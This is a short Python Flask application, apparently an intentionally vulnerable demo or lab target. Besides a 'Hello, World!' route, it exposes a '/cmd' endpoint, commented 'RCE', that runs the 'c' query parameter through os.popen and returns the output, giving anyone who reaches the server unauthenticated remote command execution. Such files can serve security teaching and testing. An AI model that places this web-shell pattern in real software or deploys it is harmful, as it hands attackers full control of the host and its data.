import os
import base64, pickle
from flask import Flask, request

app = Flask(__name__)


@app.route("/")
def index():
    return 'Hello, World!'


# RCE
@app.route("/cmd", methods=["GET"])
def rce():
    if request.args.get('c'):
        return os.popen(request.args.get('c')).read(), 200

    return ':P', 400
